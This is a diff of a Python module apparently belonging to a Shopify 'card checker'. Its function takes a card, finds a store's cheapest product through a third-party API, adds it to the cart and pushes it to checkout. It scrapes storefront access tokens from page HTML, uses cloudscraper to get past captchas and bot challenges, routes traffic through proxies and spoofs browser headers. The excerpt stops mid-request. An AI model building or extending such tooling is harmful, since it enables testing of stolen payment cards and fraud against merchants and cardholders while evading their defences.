@@ -4,7 +4,7 @@ import re
 import base64
 import json
 import time
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 import random
 import html
 from datetime import datetime, timezone, timedelta
@@ -36,6 +36,14 @@ except ImportError:
 
 # Configure logging
 logger = logging.getLogger(__name__)
+
+# Low-product details API (Silver-bullet style): returns variant, pricing, location, checkout URLs
+LOW_PRODUCT_API_BASE = "https://shopify-api-new-production.up.railway.app"
+LOW_PRODUCT_API_HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+    "Pragma": "no-cache",
+    "Accept": "*/*",
+}
 
 
 def _log_output_to_terminal(output: dict) -> None:
@@ -202,6 +210,94 @@ def _first_product_handle_from_json_text(text: str) -> Optional[str]:
                 return handle.strip()
         return None
     except (json.JSONDecodeError, TypeError):
+        return None
+
+
+def _parse_low_product_api_response(text: str) -> Optional[dict]:
+    """
+    Parse low-product API JSON response. Returns dict with variantid, price, requires_shipping,
+    formatted_price, currency_code, currency_symbol, country_code, price1 (from formatted_price)
+    or None on failure. Matches Silver-bullet parsing patterns.
+    """
+    if not text or not text.strip():
+        return None
+    t = text.strip()
+    if t.startswith("<!") or t.startswith("<html") or t.startswith("<HTML"):
+        return None
+    try:
+        data = json.loads(t)
+    except json.JSONDecodeError:
+        return None
+    if not isinstance(data, dict) or not data.get("success"):
+        return None
+    variant = data.get("variant")
+    pricing = data.get("pricing")
+    location = data.get("location")
+    if not isinstance(variant, dict):
+        return None
+    variant_id = variant.get("id")
+    if variant_id is None:
+        return None
+    try:
+        variant_id = int(variant_id)
+    except (TypeError, ValueError):
+        return None
+    requires_shipping = variant.get("requires_shipping", False)
+    price_val = None
+    currency_code = ""
+    currency_symbol = ""
+    formatted_price = ""
+    country_code = ""
+    if isinstance(pricing, dict):
+        price_val = pricing.get("price")
+        if price_val is not None:
+            try:
+                price_val = float(price_val)
+            except (TypeError, ValueError):
+                price_val = None
+        currency_code = (pricing.get("currency_code") or "")
+        currency_symbol = (pricing.get("currency_symbol") or "")
+        formatted_price = (pricing.get("formatted_price") or "")
+    if isinstance(location, dict):
+        country_code = (location.get("country_code") or "")
+    price1 = (formatted_price.lstrip("$").strip() or None) if formatted_price else None
+    return {
+        "variantid": variant_id,
+        "price": price_val if price_val is not None else 0.0,
+        "requires_shipping": requires_shipping,
+        "formatted_price": formatted_price,
+        "currency_code": currency_code,
+        "currency_symbol": currency_symbol,
+        "country_code": country_code,
+        "price1": price1 or formatted_price,
+    }
+
+
+async def _fetch_low_product_api(domain: str, session, proxy: Optional[str] = None) -> Optional[dict]:
+    """
+    GET low-product API for domain (e.g. stickerdad.com). Bulletproof headers, timeout, no redirects.
+    Returns parsed dict (variantid, price, ...) or None.
+    """
+    if not domain or not str(domain).strip():
+        return None
+    domain = str(domain).strip().lower()
+    if "://" in domain:
+        from urllib.parse import urlparse as _up
+        domain = _up(domain).netloc or domain
+    api_url = f"{LOW_PRODUCT_API_BASE}/{domain}"
+    try:
+        resp = await session.get(
+            api_url,
+            headers=dict(LOW_PRODUCT_API_HEADERS),
+            timeout=25,
+            follow_redirects=True,
+        )
+        if not resp or getattr(resp, "status_code", 0) != 200:
+            return None
+        text = (getattr(resp, "text", None) or "").strip()
+        return _parse_low_product_api_response(text)
+    except Exception as e:
+        logger.debug(f"Low-product API fetch failed for {domain}: {e}")
         return None
 
 
@@ -524,460 +620,544 @@ async def autoshopify(url, card, session, proxy=None):
         
         # Removed tokenization - using bulletproof session instead
 
-        # Bulletproof: try cloudscraper first for products to avoid triggering captcha on session
+        # Low-product API first (Silver-bullet style): GET shopify-api-new-production.up.railway.app/<site>
+        low_product_flow = False
         product_id, price = None, None
         request = None
-        if HAS_CLOUDSCRAPER:
-            try:
-                product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
-                if product_id and price is not None:
-                    logger.info(f"Products via cloudscraper-first (captcha avoidance) for {url}")
-            except Exception:
-                product_id, price = None, None
+        try:
+            low_product = await _fetch_low_product_api(domain, session, proxy)
+            if low_product and low_product.get("variantid") is not None:
+                product_id = low_product["variantid"]
+                price = low_product.get("price")
+                if price is None:
+                    price = 0.0
+                low_product_flow = True
+                logger.info(f"Low-product API used for {url}")
+        except Exception:
+            pass
 
-        # Fetch products via session only when cloudscraper didn't succeed
-        products_fetch_retries = 5  # Increased retries for connection stability
-        last_error = None
-        if not product_id:
-            for attempt in range(products_fetch_retries):
-                try:
-                    request = await session.get(f"{url}/products.json", headers=headers, follow_redirects=True, timeout=25)
-                    # Check if request failed
-                    if not request:
-                        last_error = "No response object"
-                        if attempt < products_fetch_retries - 1:
-                            await asyncio.sleep(0.8 + attempt * 0.5)  # Longer backoff
-                            continue
-                        output.update({
-                            "Response": "SITE_CONNECTION_ERROR",
-                            "Status": False,
-                        })
-                        _log_output_to_terminal(output)
-                        return output
-
-                    sc = getattr(request, "status_code", 0)
-                    if sc == 0:
-                        # Bubble up the underlying client error text if present (DNS/proxy/TLS/etc.)
-                        last_error = (getattr(request, "text", "") or "").strip() or "Status code 0 (connection failed)"
-                        if attempt < products_fetch_retries - 1:
-                            await asyncio.sleep(0.8 + attempt * 0.5)  # Exponential backoff
-                            continue
-                        output.update({
-                            "Response": f"SITE_CONNECTION_ERROR: {last_error[:80]}",
-                            "Status": False,
-                        })
-                        _log_output_to_terminal(output)
-                        return output
-
-                    if sc == 200:
-                        break
-                    if sc == 429 or (500 <= sc <= 599):
-                        if attempt < products_fetch_retries - 1:
-                            backoff = 2.0 + attempt * 1.0 if sc == 429 else 0.8 + attempt * 0.6
-                            await asyncio.sleep(backoff)
-                            continue
-                    output.update({
-                        "Response": f"SITE_HTTP_{sc}",
-                        "Status": False,
-                    })
-                    _log_output_to_terminal(output)
-                    return output
-                except Exception as e:
-                    last_error = str(e)
-                    if attempt < products_fetch_retries - 1:
-                        # Exponential backoff for connection errors
-                        await asyncio.sleep(0.8 + attempt * 0.5)
-                        continue
-                    output.update({
-                        "Response": f"SITE_CONNECTION_ERROR: {last_error[:50]}",
-                        "Status": False,
-                    })
-                    _log_output_to_terminal(output)
-                    return output
-
-            # Ensure we have a valid request after retries
-            if not request or not hasattr(request, 'text'):
-                output.update({
-                    "Response": f"SITE_CONNECTION_ERROR: {(last_error or 'unknown')[:80]}",
-                    "Status": False,
-                })
-                _log_output_to_terminal(output)
-                return output
-
-            # Parse products: bulletproof captcha avoidance - use cloudscraper when response is HTML/captcha
+        if not low_product_flow:
+            # Bulletproof: try cloudscraper first for products to avoid triggering captcha on session
             product_id, price = None, None
-            req_text = (request.text or "").strip() if hasattr(request, 'text') else ""
-            if not req_text:
-                output.update({"Response": "SITE_EMPTY_RESPONSE", "Status": False})
-                _log_output_to_terminal(output)
-                return output
+            request = None
+            if HAS_CLOUDSCRAPER:
+                try:
+                    product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
+                    if product_id and price is not None:
+                        logger.info(f"Products via cloudscraper-first (captcha avoidance) for {url}")
+                except Exception:
+                    product_id, price = None, None
 
-            # If response is HTML (captcha/challenge), try cloudscraper first without calling get_product_id
-            if req_text.startswith("<") or req_text.startswith("<!") or "captcha" in req_text.lower() or "challenge" in req_text.lower():
-                if HAS_CLOUDSCRAPER:
+            # Fetch products via session only when cloudscraper didn't succeed
+            products_fetch_retries = 5  # Increased retries for connection stability
+            last_error = None
+            if not product_id:
+                for attempt in range(products_fetch_retries):
                     try:
-                        product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
-                        logger.info(f"Products via cloudscraper bypass (HTML/captcha response) for {url}")
-                    except Exception:
-                        pass
-                if not product_id:
-                    output.update({"Response": "SITE_CAPTCHA_BLOCK", "Status": False})
+                        request = await session.get(f"{url}/products.json", headers=headers, follow_redirects=True, timeout=25)
+                        # Check if request failed
+                        if not request:
+                            last_error = "No response object"
+                            if attempt < products_fetch_retries - 1:
+                                await asyncio.sleep(0.8 + attempt * 0.5)  # Longer backoff
+                                continue
+                            output.update({
+                                "Response": "SITE_CONNECTION_ERROR",
+                                "Status": False,
+                            })
+                            _log_output_to_terminal(output)
+                            return output
+
+                        sc = getattr(request, "status_code", 0)
+                        if sc == 0:
+                            # Bubble up the underlying client error text if present (DNS/proxy/TLS/etc.)
+                            last_error = (getattr(request, "text", "") or "").strip() or "Status code 0 (connection failed)"
+                            if attempt < products_fetch_retries - 1:
+                                await asyncio.sleep(0.8 + attempt * 0.5)  # Exponential backoff
+                                continue
+                            output.update({
+                                "Response": f"SITE_CONNECTION_ERROR: {last_error[:80]}",
+                                "Status": False,
+                            })
+                            _log_output_to_terminal(output)
+                            return output
+
+                        if sc == 200:
+                            break
+                        if sc == 429 or (500 <= sc <= 599):
+                            if attempt < products_fetch_retries - 1:
+                                backoff = 2.0 + attempt * 1.0 if sc == 429 else 0.8 + attempt * 0.6
+                                await asyncio.sleep(backoff)
+                                continue
+                        output.update({
+                            "Response": f"SITE_HTTP_{sc}",
+                            "Status": False,
+                        })
+                        _log_output_to_terminal(output)
+                        return output
+                    except Exception as e:
+                        last_error = str(e)
+                        if attempt < products_fetch_retries - 1:
+                            # Exponential backoff for connection errors
+                            await asyncio.sleep(0.8 + attempt * 0.5)
+                            continue
+                        output.update({
+                            "Response": f"SITE_CONNECTION_ERROR: {last_error[:50]}",
+                            "Status": False,
+                        })
+                        _log_output_to_terminal(output)
+                        return output
+
+                # Ensure we have a valid request after retries
+                if not request or not hasattr(request, 'text'):
+                    output.update({
+                        "Response": f"SITE_CONNECTION_ERROR: {(last_error or 'unknown')[:80]}",
+                        "Status": False,
+                    })
                     _log_output_to_terminal(output)
                     return output
-            else:
-                try:
-                    product_id, price = get_product_id(request)
-                except ValueError as e:
-                    error_msg = str(e)
-                    if error_msg == "SITE_CAPTCHA_BLOCK" and HAS_CLOUDSCRAPER:
+
+                # Parse products: bulletproof captcha avoidance - use cloudscraper when response is HTML/captcha
+                product_id, price = None, None
+                req_text = (request.text or "").strip() if hasattr(request, 'text') else ""
+                if not req_text:
+                    output.update({"Response": "SITE_EMPTY_RESPONSE", "Status": False})
+                    _log_output_to_terminal(output)
+                    return output
+
+                # If response is HTML (captcha/challenge), try cloudscraper first without calling get_product_id
+                if req_text.startswith("<") or req_text.startswith("<!") or "captcha" in req_text.lower() or "challenge" in req_text.lower():
+                    if HAS_CLOUDSCRAPER:
                         try:
                             product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
-                            logger.info(f"Products fetch via cloudscraper bypass for {url}")
+                            logger.info(f"Products via cloudscraper bypass (HTML/captcha response) for {url}")
                         except Exception:
                             pass
                     if not product_id:
-                        output.update({"Response": error_msg, "Status": False})
+                        output.update({"Response": "SITE_CAPTCHA_BLOCK", "Status": False})
                         _log_output_to_terminal(output)
                         return output
+                else:
+                    try:
+                        product_id, price = get_product_id(request)
+                    except ValueError as e:
+                        error_msg = str(e)
+                        if error_msg == "SITE_CAPTCHA_BLOCK" and HAS_CLOUDSCRAPER:
+                            try:
+                                product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
+                                logger.info(f"Products fetch via cloudscraper bypass for {url}")
+                            except Exception:
+                                pass
+                        if not product_id:
+                            output.update({"Response": error_msg, "Status": False})
+                            _log_output_to_terminal(output)
+                            return output
 
-            if not product_id:
-                output.update({"Response": "NO_AVAILABLE_PRODUCTS", "Status": False})
+                if not product_id:
+                    output.update({"Response": "NO_AVAILABLE_PRODUCTS", "Status": False})
+                    _log_output_to_terminal(output)
+                    return output
+
+        if not product_id:
+            output.update({"Response": "NO_AVAILABLE_PRODUCTS", "Status": False})
+            _log_output_to_terminal(output)
+            return output
+
+        # Low-product flow: cart/add.js -> POST checkout -> redirect -> GET checkout page (skip store page & cartCreate)
+        if low_product_flow:
+            add_js_headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+                "Pragma": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "application/json",
+                "Origin": url.rstrip("/"),
+                "Referer": url.rstrip("/") + "/",
+            }
+            try:
+                add_js_resp = await session.post(
+                    f"{url.rstrip('/')}/cart/add.js",
+                    headers=add_js_headers,
+                    json={"items": [{"id": product_id, "quantity": 1}]},
+                    timeout=18,
+                )
+                add_sc = getattr(add_js_resp, "status_code", 0)
+                if add_sc != 200:
+                    output.update({"Response": f"CART_ADD_HTTP_{add_sc}", "Status": False})
+                    _log_output_to_terminal(output)
+                    return output
+                try:
+                    add_data = add_js_resp.json() if hasattr(add_js_resp, "json") else {}
+                    if isinstance(add_data, dict) and add_data.get("status") == 422:
+                        output.update({"Response": "CART_ADD_REJECTED", "Status": False})
+                        _log_output_to_terminal(output)
+                        return output
+                except Exception:
+                    pass
+                await asyncio.sleep(0.5)
+                checkout_post_resp = await session.post(
+                    f"{url.rstrip('/')}/checkout",
+                    headers={
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+                        "Pragma": "no-cache",
+                        "Accept": "*/*",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Origin": url.rstrip("/"),
+                        "Referer": url.rstrip("/") + "/",
+                    },
+                    data="",
+                    timeout=18,
+                    follow_redirects=False,
+                )
+                post_sc = getattr(checkout_post_resp, "status_code", 0)
+                if post_sc in (301, 302, 303, 307, 308):
+                    resp_headers = getattr(checkout_post_resp, "headers", None) or {}
+                    loc = resp_headers.get("location") or resp_headers.get("Location") or ""
+                    if loc:
+                        if not loc.startswith("http"):
+                            loc = urljoin(url.rstrip("/") + "/", loc)
+                        checkout_url = loc
+                    else:
+                        checkout_url = url.rstrip("/") + "/checkout"
+                else:
+                    checkout_url = url.rstrip("/") + "/checkout"
+            except Exception as e:
+                output.update({"Response": f"CART_ADD_ERROR: {str(e)[:40]}", "Status": False})
                 _log_output_to_terminal(output)
                 return output
-
-        try:
-            request = await session.get(url, follow_redirects=True, timeout=20)
-            if not request or request.status_code == 0:
+        else:
+            try:
+                request = await session.get(url, follow_redirects=True, timeout=20)
+                if not request or request.status_code == 0:
+                    output.update({
+                        "Response": "SITE_CONNECTION_ERROR",
+                        "Status": False,
+                    })
+                    _log_output_to_terminal(output)
+                    return output
+            except Exception as e:
                 output.update({
-                    "Response": "SITE_CONNECTION_ERROR",
+                    "Response": f"SITE_CONNECTION_ERROR: {str(e)[:50]}",
                     "Status": False,
                 })
                 _log_output_to_terminal(output)
                 return output
-        except Exception as e:
-            output.update({
-                "Response": f"SITE_CONNECTION_ERROR: {str(e)[:50]}",
-                "Status": False,
-            })
-            _log_output_to_terminal(output)
-            return output
 
-        # Ensure request has text attribute
-        if not hasattr(request, 'text') or not request.text:
-            output.update({
-                "Response": "SITE_EMPTY_RESPONSE",
-                "Status": False,
-            })
-            _log_output_to_terminal(output)
-            return output
-        
-        request_text_for_capture = (request.text or "") if request and hasattr(request, 'text') else ""
-        # If store page is HTML with captcha and no token, try cloudscraper (captcha bypass)
-        if (not request_text_for_capture.strip().startswith("{") and
-            any(x in (request_text_for_capture or "").lower() for x in ["captcha", "hcaptcha", "recaptcha", "challenge", "verify"])):
-            if HAS_CLOUDSCRAPER:
+            # Ensure request has text attribute
+            if not hasattr(request, 'text') or not request.text:
+                output.update({
+                    "Response": "SITE_EMPTY_RESPONSE",
+                    "Status": False,
+                })
+                _log_output_to_terminal(output)
+                return output
+
+            request_text_for_capture = (request.text or "") if request and hasattr(request, 'text') else ""
+            # If store page is HTML with captcha and no token, try cloudscraper (captcha bypass)
+            if (not request_text_for_capture.strip().startswith("{") and
+                any(x in (request_text_for_capture or "").lower() for x in ["captcha", "hcaptcha", "recaptcha", "challenge", "verify"])):
+                if HAS_CLOUDSCRAPER:
+                    try:
+                        cs_sc, cs_store = await asyncio.to_thread(_fetch_store_page_cloudscraper_sync, url, proxy)
+                        if cs_sc == 200 and cs_store:
+                            request_text_for_capture = cs_store
+                            logger.info(f"Store page via cloudscraper bypass for {url}")
+                    except Exception:
+                        pass
+
+            site_key = (
+                _capture_multi(
+                    request_text_for_capture,
+                    ('"accessToken":"', '"'),
+                    ("'accessToken':'", "'"),
+                    ('accessToken":"', '"'),
+                    ('storefrontAccessToken":"', '"'),
+                    ('StorefrontApiAccessToken":"', '"'),
+                )
+                or capture(request_text_for_capture, '"accessToken":"', '"')
+            )
+            if not site_key:
+                m = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture)
+                if m:
+                    site_key = m.group(1)
+            if not site_key:
+                m = re.search(r'storefrontAccessToken["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture, re.I)
+                if m:
+                    site_key = m.group(1)
+
+            # Bulletproof: if store page was HTML but no token found, try cloudscraper (e.g. challenge page)
+            if (not site_key or not str(site_key).strip()) and request_text_for_capture.strip().startswith("<") and HAS_CLOUDSCRAPER:
                 try:
                     cs_sc, cs_store = await asyncio.to_thread(_fetch_store_page_cloudscraper_sync, url, proxy)
                     if cs_sc == 200 and cs_store:
                         request_text_for_capture = cs_store
-                        logger.info(f"Store page via cloudscraper bypass for {url}")
+                        logger.info(f"Store page via cloudscraper (no token in HTML) for {url}")
+                        site_key = (
+                            _capture_multi(
+                                request_text_for_capture,
+                                ('"accessToken":"', '"'),
+                                ("'accessToken':'", "'"),
+                                ('accessToken":"', '"'),
+                                ('storefrontAccessToken":"', '"'),
+                                ('StorefrontApiAccessToken":"', '"'),
+                            )
+                            or capture(request_text_for_capture, '"accessToken":"', '"')
+                        )
+                        if not site_key:
+                            m = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture)
+                            if m:
+                                site_key = m.group(1)
+                        if not site_key:
+                            m = re.search(r'storefrontAccessToken["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture, re.I)
+                            if m:
+                                site_key = m.group(1)
                 except Exception:
                     pass
 
-        site_key = (
-            _capture_multi(
-                request_text_for_capture,
-                ('"accessToken":"', '"'),
-                ("'accessToken':'", "'"),
-                ('accessToken":"', '"'),
-                ('storefrontAccessToken":"', '"'),
-                ('StorefrontApiAccessToken":"', '"'),
-            )
-            or capture(request_text_for_capture, '"accessToken":"', '"')
-        )
-        if not site_key:
-            m = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture)
-            if m:
-                site_key = m.group(1)
-        if not site_key:
-            m = re.search(r'storefrontAccessToken["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture, re.I)
-            if m:
-                site_key = m.group(1)
-
-        # Bulletproof: if store page was HTML but no token found, try cloudscraper (e.g. challenge page)
-        if (not site_key or not str(site_key).strip()) and request_text_for_capture.strip().startswith("<") and HAS_CLOUDSCRAPER:
-            try:
-                cs_sc, cs_store = await asyncio.to_thread(_fetch_store_page_cloudscraper_sync, url, proxy)
-                if cs_sc == 200 and cs_store:
-                    request_text_for_capture = cs_store
-                    logger.info(f"Store page via cloudscraper (no token in HTML) for {url}")
-                    site_key = (
-                        _capture_multi(
-                            request_text_for_capture,
-                            ('"accessToken":"', '"'),
-                            ("'accessToken':'", "'"),
-                            ('accessToken":"', '"'),
-                            ('storefrontAccessToken":"', '"'),
-                            ('StorefrontApiAccessToken":"', '"'),
-                        )
-                        or capture(request_text_for_capture, '"accessToken":"', '"')
-                    )
-                    if not site_key:
-                        m = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture)
-                        if m:
-                            site_key = m.group(1)
-                    if not site_key:
-                        m = re.search(r'storefrontAccessToken["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture, re.I)
-                        if m:
-                            site_key = m.group(1)
-            except Exception:
-                pass
-
-        # print(f"{product_id}\n{price}\n{site_key}")
-        checkout_url = None
-        # Fallback when Storefront API token missing: try product page for token, then add to cart via form
-        if not site_key or not str(site_key).strip():
-            # Establish session and optionally get site_key from product page (many themes put token only there)
-            try:
-                prod_resp = await session.get(f'{url.rstrip("/")}/products.json', headers={'User-Agent': getua, 'Accept': 'application/json'}, follow_redirects=True, timeout=15)
-                prod_text = (getattr(prod_resp, 'text', None) or '') if prod_resp else ''
-                if getattr(prod_resp, 'status_code', 0) == 200 and prod_text.strip().startswith('{'):
-                    handle = _first_product_handle_from_json_text(prod_text)
-                    if handle:
-                        await asyncio.sleep(0.2)
-                        page_resp = await session.get(f'{url.rstrip("/")}/products/{handle}', headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8'}, follow_redirects=True, timeout=15)
-                        page_text = (getattr(page_resp, 'text', None) or '') if page_resp else ''
-                        if page_text:
-                            for (a, b) in [('"accessToken":"', '"'), ("'accessToken':'", "'"), ('accessToken":"', '"'), ('storefrontAccessToken":"', '"')]:
-                                try:
-                                    tok = capture(page_text, a, b)
-                                    if tok and str(tok).strip():
-                                        site_key = tok.strip()
-                                        logger.info(f"Site key from product page /products/{handle} for {url}")
-                                        break
-                                except Exception:
-                                    pass
-                            if not site_key:
-                                mm = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', page_text)
-                                if mm:
-                                    site_key = mm.group(1)
-                await asyncio.sleep(0.2)
-            except Exception as e:
-                logger.debug(f"Product page token fetch: {e}")
-            # If still no site_key, add to cart via form so we can hit /checkout
+            # print(f"{product_id}\n{price}\n{site_key}")
+            checkout_url = None
+            # Fallback when Storefront API token missing: try product page for token, then add to cart via form
             if not site_key or not str(site_key).strip():
-                add_headers = {
-                    'User-Agent': getua,
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Origin': url.rstrip('/'),
-                    'Referer': url.rstrip('/') + '/',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'sec-ch-ua': '"Chromium";v="144", "Not(A:Brand";v="8"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': f'"{clienthint}"',
-                    'sec-fetch-dest': 'document',
-                    'sec-fetch-mode': 'navigate',
-                    'sec-fetch-site': 'same-origin',
-                    'sec-fetch-user': '?1',
-                    'upgrade-insecure-requests': '1',
-                }
-                vid = product_id
+                # Establish session and optionally get site_key from product page (many themes put token only there)
                 try:
-                    if isinstance(vid, str) and vid.isdigit():
-                        vid = int(vid)
-                except (ValueError, TypeError):
-                    pass
-                variant_id_str = str(vid) if vid is not None else ''
-                for cart_attempt in range(3):
+                    prod_resp = await session.get(f'{url.rstrip("/")}/products.json', headers={'User-Agent': getua, 'Accept': 'application/json'}, follow_redirects=True, timeout=15)
+                    prod_text = (getattr(prod_resp, 'text', None) or '') if prod_resp else ''
+                    if getattr(prod_resp, 'status_code', 0) == 200 and prod_text.strip().startswith('{'):
+                        handle = _first_product_handle_from_json_text(prod_text)
+                        if handle:
+                            await asyncio.sleep(0.2)
+                            page_resp = await session.get(f'{url.rstrip("/")}/products/{handle}', headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8'}, follow_redirects=True, timeout=15)
+                            page_text = (getattr(page_resp, 'text', None) or '') if page_resp else ''
+                            if page_text:
+                                for (a, b) in [('"accessToken":"', '"'), ("'accessToken':'", "'"), ('accessToken":"', '"'), ('storefrontAccessToken":"', '"')]:
+                                    try:
+                                        tok = capture(page_text, a, b)
+                                        if tok and str(tok).strip():
+                                            site_key = tok.strip()
+                                            logger.info(f"Site key from product page /products/{handle} for {url}")
+                                            break
+                                    except Exception:
+                                        pass
+                                if not site_key:
+                                    mm = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', page_text)
+                                    if mm:
+                                        site_key = mm.group(1)
+                    await asyncio.sleep(0.2)
+                except Exception as e:
+                    logger.debug(f"Product page token fetch: {e}")
+                # If still no site_key, add to cart via form so we can hit /checkout
+                if not site_key or not str(site_key).strip():
+                    add_headers = {
+                        'User-Agent': getua,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Origin': url.rstrip('/'),
+                        'Referer': url.rstrip('/') + '/',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'sec-ch-ua': '"Chromium";v="144", "Not(A:Brand";v="8"',
+                        'sec-ch-ua-mobile': '?0',
+                        'sec-ch-ua-platform': f'"{clienthint}"',
+                        'sec-fetch-dest': 'document',
+                        'sec-fetch-mode': 'navigate',
+                        'sec-fetch-site': 'same-origin',
+                        'sec-fetch-user': '?1',
+                        'upgrade-insecure-requests': '1',
+                    }
+                    vid = product_id
                     try:
-                        if cart_attempt == 0:
-                            await session.get(url.rstrip('/'), headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}, follow_redirects=True, timeout=12)
-                            await asyncio.sleep(0.3)
-                        add_resp = await session.post(
-                            f'{url.rstrip("/")}/cart/add',
-                            headers=add_headers,
-                            data={'id': variant_id_str, 'quantity': '1', 'form_type': 'product'},
-                            timeout=18,
-                            follow_redirects=True,
-                        )
-                        sc = getattr(add_resp, 'status_code', 0)
-                        if sc in (200, 302, 303):
-                            checkout_url = url.rstrip('/') + '/checkout'
-                            await asyncio.sleep(0.6)
-                            logger.info(f"Cart/add succeeded for {url} (attempt {cart_attempt + 1})")
-                            break
-                        if sc >= 400 and variant_id_str:
-                            add_js_resp = await session.post(
-                                f'{url.rstrip("/")}/cart/add.js',
-                                headers={'User-Agent': getua, 'Content-Type': 'application/json', 'Accept': 'application/json', 'Origin': url.rstrip('/'), 'Referer': url.rstrip('/') + '/'},
-                                json={'items': [{'id': vid if isinstance(vid, int) else int(vid) if str(vid).isdigit() else vid, 'quantity': 1}]},
+                        if isinstance(vid, str) and vid.isdigit():
+                            vid = int(vid)
+                    except (ValueError, TypeError):
+                        pass
+                    variant_id_str = str(vid) if vid is not None else ''
+                    for cart_attempt in range(3):
+                        try:
+                            if cart_attempt == 0:
+                                await session.get(url.rstrip('/'), headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}, follow_redirects=True, timeout=12)
+                                await asyncio.sleep(0.3)
+                            add_resp = await session.post(
+                                f'{url.rstrip("/")}/cart/add',
+                                headers=add_headers,
+                                data={'id': variant_id_str, 'quantity': '1', 'form_type': 'product'},
                                 timeout=18,
+                                follow_redirects=True,
                             )
-                            if getattr(add_js_resp, 'status_code', 0) == 200:
-                                try:
-                                    js = add_js_resp.json() if hasattr(add_js_resp, 'json') else {}
-                                    if isinstance(js, dict) and (js.get('id') or js.get('items') or 'id' in str(js)):
-                                        checkout_url = url.rstrip('/') + '/checkout'
-                                        await asyncio.sleep(0.6)
-                                        logger.info(f"Cart/add.js succeeded for {url}")
-                                        break
-                                except Exception:
-                                    pass
+                            sc = getattr(add_resp, 'status_code', 0)
+                            if sc in (200, 302, 303):
+                                checkout_url = url.rstrip('/') + '/checkout'
+                                await asyncio.sleep(0.6)
+                                logger.info(f"Cart/add succeeded for {url} (attempt {cart_attempt + 1})")
+                                break
+                            if sc >= 400 and variant_id_str:
+                                add_js_resp = await session.post(
+                                    f'{url.rstrip("/")}/cart/add.js',
+                                    headers={'User-Agent': getua, 'Content-Type': 'application/json', 'Accept': 'application/json', 'Origin': url.rstrip('/'), 'Referer': url.rstrip('/') + '/'},
+                                    json={'items': [{'id': vid if isinstance(vid, int) else int(vid) if str(vid).isdigit() else vid, 'quantity': 1}]},
+                                    timeout=18,
+                                )
+                                if getattr(add_js_resp, 'status_code', 0) == 200:
+                                    try:
+                                        js = add_js_resp.json() if hasattr(add_js_resp, 'json') else {}
+                                        if isinstance(js, dict) and (js.get('id') or js.get('items') or 'id' in str(js)):
+                                            checkout_url = url.rstrip('/') + '/checkout'
+                                            await asyncio.sleep(0.6)
+                                            logger.info(f"Cart/add.js succeeded for {url}")
+                                            break
+                                    except Exception:
+                                        pass
+                        except Exception as e:
+                            logger.debug(f"Cart/add attempt {cart_attempt + 1} failed: {e}")
+                        if cart_attempt < 2:
+                            await asyncio.sleep(0.5 + cart_attempt * 0.3)
+                    if not checkout_url:
+                        output.update({
+                            "Response": "SITE_ACCESS_TOKEN_MISSING",
+                            "Status": False,
+                        })
+                        _log_output_to_terminal(output)
+                        return output
+
+            if site_key and str(site_key).strip():
+                headers = {
+                    'accept': 'application/json',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'content-type': 'application/json',
+                    'origin': url,
+                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+                    'sec-ch-ua-mobile': f'{mobile}',
+                    'sec-ch-ua-platform': f'"{clienthint}"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': f'{getua}',
+                    'x-sdk-variant': 'portable-wallets',
+                    'x-shopify-storefront-access-token': site_key,
+                    'x-start-wallet-checkout': 'true',
+                    'x-wallet-name': 'MoreOptions'
+                }
+
+                params = {
+                    'operation_name': 'cartCreate',
+                }
+
+                json_data = {
